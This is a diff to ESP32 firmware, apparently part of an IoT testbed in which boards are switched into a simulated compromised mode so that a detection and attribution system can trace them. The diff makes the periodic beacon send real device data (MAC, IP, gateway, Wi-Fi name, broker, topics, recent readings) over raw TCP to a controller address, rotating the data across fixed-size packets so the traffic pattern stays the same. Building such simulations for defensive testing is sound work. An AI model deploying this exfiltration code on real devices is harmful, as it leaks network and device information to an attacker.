@@ -24,6 +24,24 @@
  *                beacon / small exfiltration - the exact behaviour the
  *                attribution step is meant to catch and trace back to origin.
  *
+ *  WHAT THE BEACON CARRIES (Step 22)
+ *  ---------------------------------
+ *  Until Step 22 the beacon was a short header plus "x" padding - the right
+ *  SIZE and RHYTHM but meaningless contents. Now it carries what a real piece
+ *  of malware on this board could actually read and steal: the board's id,
+ *  MAC, IP, gateway, the Wi-Fi network NAME (never the password - the firmware
+ *  does not even format WIFI_PASS into anything it sends), signal strength, the
+ *  broker it uses, its MQTT client id and topics, uptime, free memory, and its
+ *  last few sensor readings. It is JSON, so a human reading the capture (or
+ *  src/listener.py) can see exactly what leaked.
+ *
+ *  That is MORE than fits in one 200-byte packet, so the beacon ROTATES: the
+ *  first beacon sends part 1/3, the next 2/3, the next 3/3, then round again.
+ *  Each beacon is still ONE connection of ~200 bytes every 30 s - the same
+ *  count, size and timing as before - so the detector, which reads only
+ *  connection counts, sizes and timing and never the payload, behaves exactly
+ *  as it did on the old beacon. Only what a person SEES in the bytes changed.
+ *
  *  WHY THE ATTACK IS TRIGGERED, NOT BUILT IN
  *  -----------------------------------------
  *  Flashing the same firmware to every board and switching one into the
@@ -143,6 +161,19 @@ unsigned long lastBeaconMs  = 0;
 /* A counter so each reading is distinguishable in the capture / logs. */
 unsigned long seq = 0;
 
+/* The last few sensor readings, so a beacon can "steal" something the board
+ * really has rather than filler. A tiny ring buffer: newest overwrites oldest.
+ * Temperature and humidity are kept as hundredths (ints) to stay short on the
+ * wire - 2413 means 24.13 C. */
+#define READINGS_KEPT 4
+struct Reading { unsigned long seq; int temp_c100; int hum_c100; };
+Reading recentReadings[READINGS_KEPT];
+int      readingCount = 0;            // how many of the slots are filled (<= READINGS_KEPT)
+int      readingHead  = 0;            // where the next reading goes
+
+/* Which part of the rotating payload the next beacon sends: 0, 1, 2, 0, ... */
+int beaconPart = 0;
+
 
 /* =========================================================================
  *  WI-FI
@@ -240,11 +271,19 @@ void publishReading() {
   // Fake but plausible values. random() on the ESP32 is fine for this.
   float tempC = 24.0 + (random(-200, 200) / 100.0);   // ~22..26 C
   float humid = 50.0 + (random(-500, 500) / 100.0);   // ~45..55 %
+  unsigned long thisSeq = seq++;
+
+  // Remember this reading so a later beacon can exfiltrate real recent data.
+  // +0.5 before truncating = round to nearest; both values are always positive.
+  recentReadings[readingHead] = { thisSeq, (int)(tempC * 100 + 0.5f),
+                                          (int)(humid * 100 + 0.5f) };
+  readingHead = (readingHead + 1) % READINGS_KEPT;
+  if (readingCount < READINGS_KEPT) readingCount++;
 
   char msg[192];
   snprintf(msg, sizeof(msg),
            "{\"id\":\"%s\",\"seq\":%lu,\"temp\":%.2f,\"hum\":%.2f,\"uptime\":%lu}",
-           DEVICE_ID, seq++, tempC, humid, millis() / 1000UL);
+           DEVICE_ID, thisSeq, tempC, humid, millis() / 1000UL);
 
   mqtt.publish(PUB_TOPIC, msg);
   Serial.printf("[pub] %s <- %s\n", PUB_TOPIC, msg);
@@ -255,11 +294,70 @@ void publishReading() {
  *  COMPROMISED BEHAVIOUR  -  the beacon
  * ========================================================================= */
 
+/* Build ONE beacon's JSON into buf, for part number `part` (0, 1 or 2), and
+ * pad it with trailing spaces to exactly BEACON_BYTES so every beacon is the
+ * same recognisable size on the wire. Returns the number of bytes written.
+ *
+ * The three parts together are everything a compromised board could hand to a
+ * controller WITHOUT touching anything it is not allowed to: it reports its own
+ * identity, its own network settings, the NAME of the Wi-Fi it is on (WiFi.SSID
+ * is the SSID; WIFI_PASS is never read here or anywhere in this function), the
+ * broker and topics it already talks to, and the readings it already took.
+ *
+ * Splitting the data across successive beacons - instead of making three
+ * connections at once - is deliberate: it keeps one connection every 30 s, so
+ * the traffic the detector measures is unchanged. */
+int buildBeaconPart(char* buf, size_t cap, int part) {
+  unsigned long up = millis() / 1000UL;
+  int n = 0;
+
+  if (part == 0) {
+    // Who and where: identity and network settings.
+    n = snprintf(buf, cap,
+        "{\"dev\":\"%s\",\"part\":\"1/3\",\"n\":%lu,\"up\":%lu,"
+        "\"mac\":\"%s\",\"ip\":\"%s\",\"gw\":\"%s\",\"ssid\":\"%s\",\"rssi\":%d}",
+        DEVICE_ID, seq, up,
+        WiFi.macAddress().c_str(),
+        WiFi.localIP().toString().c_str(),
+        WiFi.gatewayIP().toString().c_str(),
+        WiFi.SSID().c_str(),           // the network NAME only - never the key
+        WiFi.RSSI());
+  } else if (part == 1) {
+    // What it talks to: the broker, its client id and topics, free memory.
+    n = snprintf(buf, cap,
+        "{\"dev\":\"%s\",\"part\":\"2/3\",\"n\":%lu,\"up\":%lu,"
+        "\"broker\":\"%s:%d\",\"client\":\"%s\",\"sub\":[\"%s\"],"
+        "\"pub\":\"%s\",\"heap\":%u}",
+        DEVICE_ID, seq, up,
+        BROKER, BROKER_PORT, DEVICE_ID, CTRL_TOPIC, PUB_TOPIC,
+        (unsigned)ESP.getFreeHeap());
+  } else {
+    // What it has measured: the last few readings, oldest first.
+    n = snprintf(buf, cap,
+        "{\"dev\":\"%s\",\"part\":\"3/3\",\"n\":%lu,\"up\":%lu,\"readings\":[",
+        DEVICE_ID, seq, up);
+    for (int i = 0; i < readingCount; i++) {
+      int slot = (readingHead - readingCount + i + READINGS_KEPT) % READINGS_KEPT;
+      Reading r = recentReadings[slot];
+      n += snprintf(buf + n, cap - n, "%s[%lu,%d,%d]",
+                    (i ? "," : ""), r.seq, r.temp_c100, r.hum_c100);
+    }
+    n += snprintf(buf + n, cap - n, "]}");
+  }
+
+  // Pad with spaces up to the fixed size. The trailing spaces sit OUTSIDE the
+  // JSON object, so the payload still parses after a strip(); src/listener.py
+  // reads it that way.
+  while (n < BEACON_BYTES && (size_t)n < cap - 1) buf[n++] = ' ';
+  buf[n] = '\0';
+  return n;
+}
+
 /* Open a raw TCP connection straight to TARGET_IP:TARGET_PORT (bypassing the
  * broker entirely - a compromised device talks to its controller directly),
- * push ~200 bytes, and close. This is intentionally simple: connect, send,
- * disconnect. It is the traffic the attribution graph should trace back to
- * whichever board was told to "attack" first. */
+ * push ~200 bytes, and close. Connect, send, disconnect. Each call sends the
+ * NEXT rotating part (1/3 -> 2/3 -> 3/3 -> 1/3 ...), so over three beacons the
+ * whole picture leaks, one ~200-byte connection at a time. */
 void sendBeacon() {
   WiFiClient beacon;                 // a fresh socket each time, then closed
 
@@ -271,17 +369,9 @@ void sendBeacon() {
     return;
   }
 
-  // Build a fixed ~200-byte payload: a short JSON header identifying the
-  // sender, then padding to reach BEACON_BYTES so every beacon is the same
-  // recognisable size on the wire.
   char buf[BEACON_BYTES + 1];
-  int n = snprintf(buf, sizeof(buf),
-                   "{\"id\":\"%s\",\"beacon\":%lu,\"t\":%lu,\"pad\":\"",
-                   DEVICE_ID, seq, millis() / 1000UL);
-  while (n < BEACON_BYTES - 2) buf[n++] = 'x';   // pad
-  buf[n++] = '"';
-  buf[n++] = '}';
-  buf[n]   = '\0';
+  int n = buildBeaconPart(buf, sizeof(buf), beaconPart);
+  beaconPart = (beaconPart + 1) % 3;             // advance for next time
 
   beacon.write((const uint8_t*)buf, n);
   beacon.stop();                     // close immediately - short-lived by design
